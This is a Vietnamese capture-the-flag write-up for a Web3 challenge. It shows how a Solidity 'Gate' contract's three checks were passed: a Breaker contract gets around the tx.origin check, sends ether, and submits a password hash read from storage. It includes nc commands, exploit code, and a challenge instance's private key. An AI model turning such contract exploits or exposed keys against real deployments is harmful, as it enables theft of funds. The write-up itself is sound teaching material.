# Gateway — Web3 (199 points)

**Flag:** `CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}` · **Files:** `Gate.sol`, `Setup.sol`

## Đề bài

Gateway là ba cửa bảo vệ trong contract UPDC trên Quantum Nexus Network. Cần hoàn thành: (1) gọi từ một contract khác (`tx.origin != msg.sender`), (2) transfer ether qua `receive()`, (3) submit password đúng. Instance ở `nc 34.116.80.78:31337`.

## Phân tích ban đầu

- Contract `Gate`: 4 slots state (`stepped`, `funded`, `solved`), password hash lưu trong slot 1
- Password được tính từ `keccak256("gateway to the flag")` — có thể kiểm chứng bằng `eth_getStorageAt`
- NC service hoạt động như ethernaut-style instance factory: mỗi action (`1 launch / 2 kill / 3 get flag`) là một TCP connection riêng biệt
- Credentials nhận được sau khi `kill + relaunch`: uuid, rpc endpoint, private key, setup contract address
- RPC proxy là mainnet fork (chainId 1, ~26M block), player được 5000 ETH funding

## Các hướng đã loại

Không áp dụng vì đây là web3 challenge, không phải forensics/crypto/pwn. Tập trung vào contract exploitation thay vì brute force password.

## Chuỗi khai thác

**Bước 1 — Khảo sát gateway nc và credentials.**

```bash
echo -e "3\nR3:TURИ" | nc 34.116.80.78 31337
# Output: "are you sure you solved it?" → chưa ai solve

# Kill old instance (nếu đang chạy)
echo -e "2\nR3:TURИ" | nc 34.116.80.78 31337
# Output: "Instance killed"

# Launch mới để lấy credentials
echo -e "1\nR3:TURИ" | nc 34.116.80.78 31337
# Output:
#   uuid:           47c4a887-8b71-4b92-aa4d-eea88f7669f2
#   rpc endpoint:   http://34.116.80.78:8545/47c4a887-8b71-4b92-aa4d-eea88f7669f2
#   private key:    0xd5c7492813f0829fc5534896e58179c3b618c6227b9c5df38f5d2b1aba6ba206
#   setup contract: 0x1ACF30FAB13942fBf5581E8fbDb72D01e2Ad5D3b
```

**Bước 2 — Verify password hash qua storage slot.**

```python
>>> from web3 import Web3
>>> Web3.keccak(text='gateway to the flag').hex()
'90cd83d75da724f03cbd4c1bd73dbfca4325ab5c4930082484b6f6aa9234d70b'
>>> # eth_getStorageAt(gate, 1) => 0x90cd83d7...9234d70b === MATCH
```

**Bước 3 — Deploy Breaker contract.**

Breaker bypass `tx.origin != msg.sender` requirement:

```solidity
contract Breaker {
    IGate public gate;
    bytes32 public secret;
    
    constructor(IGate _gate, bytes32 _secret) payable {
        gate = _gate; secret = _secret;
    }
    
    function run() external {
        gate.enter();                                    // Door 1
        (bool ok, ) = address(gate).call{value: 1 ether}("");  // Door 2
        require(ok, "door2");
        gate.claim(secret);                              // Door 3
    }
    
    receive() external payable {}
}
```

Deploy với 3 ETH value, constructor args `(GATE_ADDR, password_hash)`.

**Bước 4 — Call run() and verify.**

```json
{
  "deploy": "status 0x1, contract 0xFc5ac01775cF736D929572EC7478ed6930703506",
  "run": "status 0x1, gas 0xf362",
  "isSolved": "0x0000000000000000000000000000000000000000000000000000000000000001"
}
```

Gate slots 2/3/4 → `0x010101` (stepped, funded, solved = true).

**Bước N — Get flag.**

```bash
echo -e "3\nR3:TURИ" | nc 34.116.80.78 31337
# Output: CSS{B451C_BL0CKCH41N_5K1LL5}
```

Định dạng flag: `CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}`.

## Flag

```
CSSCTF{CSS{B451C_BL0CKCH41N_5K1LL5}}
```

## Reproduce

```bash
export CSS_RPC=http://34.116.80.78:8545/47c4a887-8b71-4b92-aa4d-eea88f7669f2
export CSS_PK=d5c7492813f0829fc5534896e58179c3b618c6227b9c5df38f5d2b1aba6ba206

cd %TEMP%\css_gate
python exploit.py files/Gate.sol
# Output: ✓ FLAG CHAINED!
```
